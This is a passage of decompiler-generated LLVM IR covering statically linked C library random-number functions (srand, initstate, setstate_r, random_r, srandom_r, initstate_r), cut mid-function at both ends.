  br i1 %v2_8053424, label %dec_label_pc_805342b, label %dec_label_pc_8053428

dec_label_pc_8053428:                             ; preds = %entry
  br label %dec_label_pc_805342b

dec_label_pc_805342b:                             ; preds = %entry, %dec_label_pc_8053428
  %v3_8053434 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8053439 = load i32, i32* @esi, align 4
  ret i32 %v0_8053439

; uselistorder directives
  uselistorder label %dec_label_pc_805342b, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8053450 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053450, i32* @ebx, align 4
  %v4_8053455 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134540701, i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v1_8053461 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v0_805346b = load i32, i32* bitcast (i32** @global_var_8062960.261 to i32*), align 32
  store i32 %v0_805346b, i32* @esi, align 4
  %v4_805347d = inttoptr i32 %arg2 to i32*
  %v5_805347d = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_805347d, i32 %arg3, i32 ptrtoint (i32* @global_var_8062958 to i32))
  %v3_8053488 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 ptrtoint (i32** @global_var_806295c.262 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053498 = load i32, i32* @ebx, align 4
  store i32 %v0_8053498, i32* %stack_var_-4, align 4
  %v2_80534a6 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80534a6, i32* @ebx, align 4
  %v4_80534ab = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134540701, i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v1_80534b7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v2_80534c7 = sext i32 %arg1 to i64
  %v3_80534c7 = call i32 @srandom_r(i64 %v2_80534c7, i32 ptrtoint (i32* @global_var_8062958 to i32))
  store i32 %arg1, i32* @ecx, align 4
  %v3_80534d1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_80534d9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80534d9, i32* @ebx, align 4
  ret i32 %v3_80534d1

; uselistorder directives
  uselistorder i32* @global_var_8062958, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8062958 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8062940.258 to i32), { 5, 1, 6, 2, 7, 3, 0, 8, 4 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_80534df = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_80534eb = add i32 %arg1, 4
  store i32 %v1_80534eb, i32* %esi.global-to-local, align 4
  %v1_80534ee = add i32 %tmp4, 12
  %v2_80534ee = inttoptr i32 %v1_80534ee to i32*
  %v3_80534ee = load i32, i32* %v2_80534ee, align 4
  store i32 %v3_80534ee, i32* @ecx, align 4
  %v1_80534f1 = add i32 %tmp4, 8
  %v2_80534f1 = inttoptr i32 %v1_80534f1 to i32*
  %v3_80534f1 = load i32, i32* %v2_80534f1, align 4
  %v1_80534f4 = icmp eq i32 %v3_80534ee, 0
  %v1_80534f6 = icmp eq i1 %v1_80534f4, false
  br i1 %v1_80534f6, label %dec_label_pc_8053501, label %dec_label_pc_80534f8

dec_label_pc_80534f8:                             ; preds = %entry
  %v1_80534f8 = add i32 %v3_80534f1, -4
  %v2_80534f8 = inttoptr i32 %v1_80534f8 to i32*
  store i32 0, i32* %v2_80534f8, align 4
  br label %dec_label_pc_8053511

dec_label_pc_8053501:                             ; preds = %entry
  %v1_8053501 = add i32 %tmp4, 4
  %v2_8053501 = inttoptr i32 %v1_8053501 to i32*
  %v3_8053501 = load i32, i32* %v2_8053501, align 4
  %v2_8053504 = sub i32 %v3_8053501, %v3_80534f1
  %v2_8053506 = sdiv i32 %v2_8053504, 4
  %v3_8053509 = mul i32 %v2_8053506, 5
  %v2_805350c = add i32 %v3_8053509, %v3_80534ee
  store i32 %v2_805350c, i32* %eax.global-to-local, align 4
  %v2_805350e = add i32 %v3_80534f1, -4
  %v3_805350e = inttoptr i32 %v2_805350e to i32*
  store i32 %v2_805350c, i32* %v3_805350e, align 4
  br label %dec_label_pc_8053511

dec_label_pc_8053511:                             ; preds = %dec_label_pc_80534f8, %dec_label_pc_8053501
  %v0_8053511 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053511 = add i32 %v0_8053511, -4
  %v2_8053511 = inttoptr i32 %v1_8053511 to i32*
  %v3_8053511 = load i32, i32* %v2_8053511, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8053519 = ashr i32 %v3_8053511, 31
  %v2_805351a = zext i32 %v3_8053511 to i64
  %v4_805351a = zext i32 %v1_8053519 to i64
  %v5_805351a = mul nuw i64 %v4_805351a, 4294967296
  %v6_805351a = or i64 %v5_805351a, %v2_805351a
  %v8_805351a = sdiv i64 %v6_805351a, 5
  %v9_805351a = trunc i64 %v8_805351a to i32
  store i32 %v9_805351a, i32* %eax.global-to-local, align 4
  %v10_805351a = srem i64 %v6_805351a, 5
  %v11_805351a = trunc i64 %v10_805351a to i32
  %v6_805351f = icmp ugt i32 %v11_805351a, 4
  br i1 %v6_805351f, label %dec_label_pc_805355f, label %dec_label_pc_8053521

dec_label_pc_8053521:                             ; preds = %dec_label_pc_8053511
  %v1_8053521 = mul i32 %v11_805351a, 4
  %v2_8053521 = add i32 %v1_8053521, ptrtoint (i32* @global_var_805c154.263 to i32)
  %v3_8053521 = inttoptr i32 %v2_8053521 to i32*
  %v4_8053521 = load i32, i32* %v3_8053521, align 4
  store i32 %v4_8053521, i32* @ecx, align 4
  %v2_8053528 = add i32 %v1_8053521, ptrtoint (i32* @global_var_805c140.264 to i32)
  %v3_8053528 = inttoptr i32 %v2_8053528 to i32*
  %v4_8053528 = load i32, i32* %v3_8053528, align 4
  store i32 %v4_8053528, i32* %ebp.global-to-local, align 4
  %v1_805352f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805352f = add i32 %v1_805352f, 16
  %v3_805352f = inttoptr i32 %v2_805352f to i32*
  store i32 %v4_8053521, i32* %v3_805352f, align 4
  %v0_8053532 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053532 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053532 = add i32 %v1_8053532, 20
  %v3_8053532 = inttoptr i32 %v2_8053532 to i32*
  store i32 %v0_8053532, i32* %v3_8053532, align 4
  %v1_8053535 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053535 = add i32 %v1_8053535, 12
  %v3_8053535 = inttoptr i32 %v2_8053535 to i32*
  store i32 %v11_805351a, i32* %v3_8053535, align 4
  %v1_8053538 = icmp eq i32 %v11_805351a, 0
  br i1 %v1_8053538, label %dec_label_pc_8053552, label %dec_label_pc_805353c

dec_label_pc_805353c:                             ; preds = %dec_label_pc_8053521
  %v0_805353c = load i32, i32* %esi.global-to-local, align 4
  %v1_805353c = add i32 %v0_805353c, -4
  %v2_805353c = inttoptr i32 %v1_805353c to i32*
  %v3_805353c = load i32, i32* %v2_805353c, align 4
  %v1_805353f = ashr i32 %v3_805353c, 31
  %v0_8053540 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053540 = zext i32 %v3_805353c to i64
  %v4_8053540 = zext i32 %v1_805353f to i64
  %v5_8053540 = mul nuw i64 %v4_8053540, 4294967296
  %v6_8053540 = or i64 %v5_8053540, %v2_8053540
  %v7_8053540 = zext i32 %v0_8053540 to i64
  %v8_8053540 = sdiv i64 %v6_8053540, %v7_8053540
  %v9_8053540 = trunc i64 %v8_8053540 to i32
  %v2_8053542 = mul i32 %v9_8053540, 4
  %v3_8053542 = add i32 %v2_8053542, %v0_805353c
  %v1_8053545 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053545 = add i32 %v1_8053545, %v9_8053540
  store i32 %v2_8053545, i32* %eax.global-to-local, align 4
  %v1_8053547 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053547 = add i32 %v1_8053547, 4
  %v3_8053547 = inttoptr i32 %v2_8053547 to i32*
  store i32 %v3_8053542, i32* %v3_8053547, align 4
  %v0_805354a = load i32, i32* %eax.global-to-local, align 4
  %v1_805354a = ashr i32 %v0_805354a, 31
  %v0_805354b = load i32, i32* @ecx, align 4
  %v2_805354b = zext i32 %v0_805354a to i64
  %v4_805354b = zext i32 %v1_805354a to i64
  %v5_805354b = mul nuw i64 %v4_805354b, 4294967296
  %v6_805354b = or i64 %v5_805354b, %v2_805354b
  %v7_805354b = zext i32 %v0_805354b to i64
  %v8_805354b = sdiv i64 %v6_805354b, %v7_805354b
  %v9_805354b = trunc i64 %v8_805354b to i32
  store i32 %v9_805354b, i32* %eax.global-to-local, align 4
  %v10_805354b = srem i64 %v6_805354b, %v7_805354b
  %v11_805354b = trunc i64 %v10_805354b to i32
  %v0_805354d = load i32, i32* %esi.global-to-local, align 4
  %v2_805354d = mul i32 %v11_805354b, 4
  %v3_805354d = add i32 %v2_805354d, %v0_805354d
  %v1_8053550 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053550 = inttoptr i32 %v1_8053550 to i32*
  store i32 %v3_805354d, i32* %v2_8053550, align 4
  br label %dec_label_pc_8053552

dec_label_pc_8053552:                             ; preds = %dec_label_pc_8053521, %dec_label_pc_805353c
  %v0_8053552 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053552 = load i32, i32* @ecx, align 4
  %v2_8053552 = mul i32 %v1_8053552, 4
  %v3_8053552 = add i32 %v2_8053552, %v0_8053552
  store i32 %v3_8053552, i32* %eax.global-to-local, align 4
  %v1_8053555 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053555 = add i32 %v1_8053555, 8
  %v3_8053555 = inttoptr i32 %v2_8053555 to i32*
  store i32 %v0_8053552, i32* %v3_8053555, align 4
  %v0_8053558 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053558 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053558 = add i32 %v1_8053558, 24
  %v3_8053558 = inttoptr i32 %v2_8053558 to i32*
  store i32 %v0_8053558, i32* %v3_8053558, align 4
  br label %dec_label_pc_805356d

dec_label_pc_805355f:                             ; preds = %dec_label_pc_8053511
  %v1_805355f = call i32 @__errno_location(i32 %v0_80534df)
  store i32 %v1_805355f, i32* %eax.global-to-local, align 4
  %v1_8053564 = inttoptr i32 %v1_805355f to i32*
  store i32 22, i32* %v1_8053564, align 4
  br label %dec_label_pc_805356d

dec_label_pc_805356d:                             ; preds = %dec_label_pc_8053552, %dec_label_pc_805355f
  %storemerge = phi i32 [ -1, %dec_label_pc_805355f ], [ 0, %dec_label_pc_8053552 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80534df, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8053552, { 1, 0 }
  uselistorder i32 %v11_805351a, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805356d, { 1, 0 }
  uselistorder label %dec_label_pc_8053552, { 1, 0 }
  uselistorder label %dec_label_pc_8053511, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8053578 = load i32, i32* @ebx, align 4
  store i32 %v0_8053578, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8053581 = add i32 %tmp2, 8
  %v2_8053581 = inttoptr i32 %v1_8053581 to i32*
  %v3_8053581 = load i32, i32* %v2_8053581, align 4
  store i32 %v3_8053581, i32* %esi.global-to-local, align 4
  %v1_8053584 = add i32 %tmp2, 12
  %v2_8053584 = inttoptr i32 %v1_8053584 to i32*
  %v3_8053584 = load i32, i32* %v2_8053584, align 4
  %v4_8053584 = icmp eq i32 %v3_8053584, 0
  %v1_8053588 = icmp eq i1 %v4_8053584, false
  br i1 %v1_8053588, label %dec_label_pc_80535a1, label %dec_label_pc_805358a

dec_label_pc_805358a:                             ; preds = %entry
  %v2_805358a = inttoptr i32 %v3_8053581 to i32*
  %v3_805358a = load i32, i32* %v2_805358a, align 4
  %v5_805358a = mul i32 %v3_805358a, 1103515245
  %v1_8053590 = add i32 %v5_805358a, 12345
  %v1_8053595 = urem i32 %v1_8053590, -2147483648
  store i32 %v1_8053595, i32* %eax.global-to-local, align 4
  store i32 %v1_8053595, i32* %v2_805358a, align 4
  %v0_805359c = load i32, i32* %eax.global-to-local, align 4
  %v1_805359c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805359c = inttoptr i32 %v1_805359c to i32*
  store i32 %v0_805359c, i32* %v2_805359c, align 4
  br label %dec_label_pc_80535cd

dec_label_pc_80535a1:                             ; preds = %entry
  %v1_80535a1 = add i32 %tmp2, 4
  %v2_80535a1 = inttoptr i32 %v1_80535a1 to i32*
  %v3_80535a1 = load i32, i32* %v2_80535a1, align 4
  store i32 %v3_80535a1, i32* @ecx, align 4
  %v2_80535a4 = load i32, i32* %arg1, align 4
  store i32 %v2_80535a4, i32* %edx.global-to-local, align 4
  %v1_80535a6 = add i32 %tmp2, 24
  %v2_80535a6 = inttoptr i32 %v1_80535a6 to i32*
  %v3_80535a6 = load i32, i32* %v2_80535a6, align 4
  store i32 %v3_80535a6, i32* %edi.global-to-local, align 4
  %v1_80535a9 = inttoptr i32 %v3_80535a1 to i32*
  %v2_80535a9 = load i32, i32* %v1_80535a9, align 4
  store i32 %v2_80535a9, i32* %eax.global-to-local, align 4
  %v1_80535ab = inttoptr i32 %v2_80535a4 to i32*
  %v2_80535ab = load i32, i32* %v1_80535ab, align 4
  %v4_80535ab = add i32 %v2_80535ab, %v2_80535a9
  store i32 %v4_80535ab, i32* %v1_80535ab, align 4
  %v0_80535ad = load i32, i32* %edx.global-to-local, align 4
  %v1_80535ad = inttoptr i32 %v0_80535ad to i32*
  %v2_80535ad = load i32, i32* %v1_80535ad, align 4
  %v1_80535af = add i32 %v0_80535ad, 4
  store i32 %v1_80535af, i32* %edx.global-to-local, align 4
  %v2_80535b2 = udiv i32 %v2_80535ad, 2
  %v1_80535b4 = load i32, i32* %edi.global-to-local, align 4
  %v7_80535b4 = icmp ult i32 %v1_80535af, %v1_80535b4
  %v1_80535b6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80535b6 = inttoptr i32 %v1_80535b6 to i32*
  store i32 %v2_80535b2, i32* %v2_80535b6, align 4
  %v0_80535b9 = load i32, i32* @ecx, align 4
  %v1_80535b9 = add i32 %v0_80535b9, 4
  store i32 %v1_80535b9, i32* %eax.global-to-local, align 4
  br i1 %v7_80535b4, label %dec_label_pc_80535c2, label %dec_label_pc_80535be

dec_label_pc_80535be:                             ; preds = %dec_label_pc_80535a1
  %v0_80535be = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80535be, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80535c8

dec_label_pc_80535c2:                             ; preds = %dec_label_pc_80535a1
  %v1_80535c2 = load i32, i32* %edi.global-to-local, align 4
  %v7_80535c2 = icmp ult i32 %v1_80535b9, %v1_80535c2
  br i1 %v7_80535c2, label %dec_label_pc_80535c8, label %dec_label_pc_80535c6

dec_label_pc_80535c6:                             ; preds = %dec_label_pc_80535c2
  %v0_80535c6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80535c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535c8

dec_label_pc_80535c8:                             ; preds = %dec_label_pc_80535c2, %dec_label_pc_80535be, %dec_label_pc_80535c6
  %v0_80535c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80535c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80535c8 = inttoptr i32 %v1_80535c8 to i32*
  store i32 %v0_80535c8, i32* %v2_80535c8, align 4
  %v0_80535ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80535ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80535ca = add i32 %v1_80535ca, 4
  %v3_80535ca = inttoptr i32 %v2_80535ca to i32*
  store i32 %v0_80535ca, i32* %v3_80535ca, align 4
  br label %dec_label_pc_80535cd

dec_label_pc_80535cd:                             ; preds = %dec_label_pc_805358a, %dec_label_pc_80535c8
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80535cf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80535cf, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053595, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80535cd, { 1, 0 }
  uselistorder label %dec_label_pc_80535c8, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80535d4 = load i32, i32* @ebp, align 4
  %v0_80535d5 = load i32, i32* @edi, align 4
  %v0_80535d6 = load i32, i32* @esi, align 4
  %v0_80535d7 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_80535e2 = trunc i64 %arg1 to i32
  store i32 %v4_80535e2, i32* %eax.global-to-local, align 4
  %v1_80535e6 = add i32 %arg2, 12
  %v2_80535e6 = inttoptr i32 %v1_80535e6 to i32*
  %v3_80535e6 = load i32, i32* %v2_80535e6, align 4
  store i32 %v3_80535e6, i32* %edx.global-to-local, align 4
  %v6_80535ec = icmp ugt i32 %v3_80535e6, 4
  br i1 %v6_80535ec, label %dec_label_pc_8053660, label %dec_label_pc_80535ee

dec_label_pc_80535ee:                             ; preds = %entry
  %v1_80535ee = add i32 %arg2, 8
  %v2_80535ee = inttoptr i32 %v1_80535ee to i32*
  %v3_80535ee = load i32, i32* %v2_80535ee, align 4
  store i32 %v3_80535ee, i32* %ebx.global-to-local, align 4
  %v1_80535f1 = icmp eq i32 %v4_80535e2, 0
  %v1_80535f3 = icmp eq i1 %v1_80535f1, false
  br i1 %v1_80535f3, label %dec_label_pc_80535f7, label %dec_label_pc_80535f5

dec_label_pc_80535f5:                             ; preds = %dec_label_pc_80535ee
  %v1_80535f5 = and i32 %v4_80535e2, -256
  %v2_80535f5 = or i32 %v1_80535f5, 1
  store i32 %v2_80535f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535f7

dec_label_pc_80535f7:                             ; preds = %dec_label_pc_80535ee, %dec_label_pc_80535f5
  %v0_80535f7 = phi i32 [ %v4_80535e2, %dec_label_pc_80535ee ], [ %v2_80535f5, %dec_label_pc_80535f5 ]
  %v2_80535f7 = inttoptr i32 %v3_80535ee to i32*
  store i32 %v0_80535f7, i32* %v2_80535f7, align 4
  %v1_80535f9 = icmp eq i32 %v3_80535e6, 0
  br i1 %v1_80535f9, label %dec_label_pc_805365e, label %dec_label_pc_80535fd

dec_label_pc_80535fd:                             ; preds = %dec_label_pc_80535f7
  %v0_80535fd = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80535fd, i32* %edx.global-to-local, align 4
  %v0_80535ff = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80535ff, i32* %ecx.global-to-local, align 4
  %v0_8053601 = load i32, i32* @esi, align 4
  %v1_8053601 = add i32 %v0_8053601, 16
  %v2_8053601 = inttoptr i32 %v1_8053601 to i32*
  %v3_8053601 = load i32, i32* %v2_8053601, align 4
  store i32 %v3_8053601, i32* %eax.global-to-local, align 4
  %v4_8053609 = sext i32 %v3_8053601 to i64
  store i64 %v4_8053609, i64* %stack_var_-40, align 8
  %v5_805363b30 = icmp sgt i32 %v3_8053601, 1
  br i1 %v5_805363b30, label %dec_label_pc_805360e, label %dec_label_pc_805363d

dec_label_pc_805360e:                             ; preds = %dec_label_pc_80535fd, %dec_label_pc_805360e.dec_label_pc_805360e_crit_edge
  %v0_8053632 = phi i32 [ %v0_8053632.pre, %dec_label_pc_805360e.dec_label_pc_805360e_crit_edge ], [ %v0_80535ff, %dec_label_pc_80535fd ]
  %v0_805360e = phi i32 [ %v0_805360e.pre, %dec_label_pc_805360e.dec_label_pc_805360e_crit_edge ], [ %v0_80535fd, %dec_label_pc_80535fd ]
  %v0_805363531 = phi i32 [ %v0_8053638.pre, %dec_label_pc_805360e.dec_label_pc_805360e_crit_edge ], [ 1, %dec_label_pc_80535fd ]
  %v1_8053615 = ashr i32 %v0_805360e, 31
  %v2_8053616 = zext i32 %v0_805360e to i64
  %v4_8053616 = zext i32 %v1_8053615 to i64
  %v5_8053616 = mul nuw i64 %v4_8053616, 4294967296
  %v6_8053616 = or i64 %v5_8053616, %v2_8053616
  %v8_8053616 = sdiv i64 %v6_8053616, 127773
  %v9_8053616 = trunc i64 %v8_8053616 to i32
  %v10_8053616 = srem i64 %v6_8053616, 127773
  %v3_805361c = mul nsw i64 %v10_8053616, 16807
  %v4_805361c = trunc i64 %v3_805361c to i32
  %v3_8053622 = mul i32 %v9_8053616, 2836
  store i32 %v3_8053622, i32* %eax.global-to-local, align 4
  %v2_8053628 = sub i32 %v4_805361c, %v3_8053622
  %v13_8053628 = icmp slt i32 %v2_8053628, 0
  %v1_805362a = icmp eq i1 %v13_8053628, false
  %v1_805362c = add i32 %v2_8053628, 2147483647
  %v2_8053628.v1_805362c = select i1 %v1_805362a, i32 %v2_8053628, i32 %v1_805362c
  store i32 %v2_8053628.v1_805362c, i32* %edx.global-to-local, align 4
  %v1_8053632 = add i32 %v0_8053632, 4
  store i32 %v1_8053632, i32* %ecx.global-to-local, align 4
  %v1_8053635 = add i32 %v0_805363531, 1
  store i32 %v1_8053635, i32* @edi, align 4
  %v2_8053636 = inttoptr i32 %v1_8053632 to i32*
  store i32 %v2_8053628.v1_805362c, i32* %v2_8053636, align 4
  %v0_8053638.pre = load i32, i32* @edi, align 4
  %v3_8053638.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8053638.pre to i32
  %v5_805363b = icmp slt i32 %v0_8053638.pre, %extract.t12
  br i1 %v5_805363b, label %dec_label_pc_805360e.dec_label_pc_805360e_crit_edge, label %dec_label_pc_8053638.dec_label_pc_805363d_crit_edge

dec_label_pc_805360e.dec_label_pc_805360e_crit_edge: ; preds = %dec_label_pc_805360e
  %v0_805360e.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8053632.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805360e

dec_label_pc_8053638.dec_label_pc_805363d_crit_edge: ; preds = %dec_label_pc_805360e
  %v0_805363d.pre = load i32, i32* @esi, align 4
  %v0_8053640.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805363d

dec_label_pc_805363d:                             ; preds = %dec_label_pc_8053638.dec_label_pc_805363d_crit_edge, %dec_label_pc_80535fd
  %v0_8053640 = phi i32 [ %v0_8053640.pre, %dec_label_pc_8053638.dec_label_pc_805363d_crit_edge ], [ %v0_80535ff, %dec_label_pc_80535fd ]
  %v0_805363d = phi i32 [ %v0_805363d.pre, %dec_label_pc_8053638.dec_label_pc_805363d_crit_edge ], [ %v0_8053601, %dec_label_pc_80535fd ]
  %v1_805363d = add i32 %v0_805363d, 20
  %v2_805363d = inttoptr i32 %v1_805363d to i32*
  %v3_805363d = load i32, i32* %v2_805363d, align 4
  store i32 %v3_805363d, i32* %eax.global-to-local, align 4
  %v2_8053640 = add i32 %v0_805363d, 4
  %v3_8053640 = inttoptr i32 %v2_8053640 to i32*
  store i32 %v0_8053640, i32* %v3_8053640, align 4
  %v0_8053643 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053643 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053643 = mul i32 %v1_8053643, 4
  %v3_8053643 = add i32 %v2_8053643, %v0_8053643
  store i32 %v3_8053643, i32* %eax.global-to-local, align 4
  %v1_8053646 = load i32, i32* @esi, align 4
  %v2_8053646 = inttoptr i32 %v1_8053646 to i32*
  store i32 %v3_8053643, i32* %v2_8053646, align 4
  %v3_8053648 = load i64, i64* %stack_var_-40, align 8
  %v6_8053648 = mul nsw i64 %v3_8053648, 10
  %v7_8053648 = trunc i64 %v6_8053648 to i32
  %v2_805364e = ptrtoint i32* %stack_var_-20 to i32
  %v1_805365b24 = add i32 %v7_8053648, -1
  %v9_805365b28 = icmp slt i32 %v1_805365b24, 0
  store i32 %v1_805365b24, i32* @ebx, align 4
  %v1_805365c29 = icmp eq i1 %v9_805365b28, false
  br i1 %v1_805365c29, label %dec_label_pc_805364e, label %dec_label_pc_805365e

dec_label_pc_805364e:                             ; preds = %dec_label_pc_805363d, %dec_label_pc_805364e
  store i32 %v2_805364e, i32* %eax.global-to-local, align 4
  %v0_8053653 = load i32, i32* @esi, align 4
  %v2_8053654 = inttoptr i32 %v0_8053653 to i32*
  %v3_8053654 = call i32 @__GI_random_r(i32* %v2_8053654, i32 %v2_805364e)
  store i32 %v0_8053653, i32* %eax.global-to-local, align 4
  store i32 %v2_805364e, i32* %edx.global-to-local, align 4
  %v0_805365b.pre = load i32, i32* @ebx, align 4
  %v1_805365b = add i32 %v0_805365b.pre, -1
  %v9_805365b = icmp slt i32 %v1_805365b, 0
  store i32 %v1_805365b, i32* @ebx, align 4
  %v1_805365c = icmp eq i1 %v9_805365b, false
  br i1 %v1_805365c, label %dec_label_pc_805364e, label %dec_label_pc_805365e

dec_label_pc_805365e:                             ; preds = %dec_label_pc_805363d, %dec_label_pc_805364e, %dec_label_pc_80535f7
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053660

dec_label_pc_8053660:                             ; preds = %entry, %dec_label_pc_805365e
  %v0_8053663 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805365e ]
  store i32 %v0_8053663, i32* %eax.global-to-local, align 4
  store i32 %v0_80535d7, i32* @ebx, align 4
  store i32 %v0_80535d6, i32* @esi, align 4
  store i32 %v0_80535d5, i32* @edi, align 4
  store i32 %v0_80535d4, i32* @ebp, align 4
  ret i32 %v0_8053663

; uselistorder directives
  uselistorder i32 %v0_8053663, { 1, 0 }
  uselistorder i32 %v1_805365b, { 1, 0 }
  uselistorder i32 %v0_805363d, { 1, 0 }
  uselistorder i32 %v0_8053638.pre, { 1, 0 }
  uselistorder i32 %v2_8053628.v1_805362c, { 1, 0 }
  uselistorder i32 %v0_805360e, { 1, 0 }
  uselistorder i32 %v0_80535ff, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053660, { 1, 0 }
  uselistorder label %dec_label_pc_805365e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805364e, { 1, 0 }
  uselistorder label %dec_label_pc_805360e, { 1, 0 }
  uselistorder label %dec_label_pc_80535f7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805366a = load i32, i32* @ebp, align 4
  %v0_805366b = load i32, i32* @edi, align 4
  %v0_805366d = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_805368e, label %dec_label_pc_8053682

dec_label_pc_8053682:                             ; preds = %entry
  %v2_8053682 = icmp ult i32 %arg3, 256
  %v1_8053689 = select i1 %v2_8053682, i32 5, i32 4
  store i32 %v1_8053689, i32* @ebx, align 4
  br label %dec_label_pc_80536a4

dec_label_pc_805368e:                             ; preds = %entry
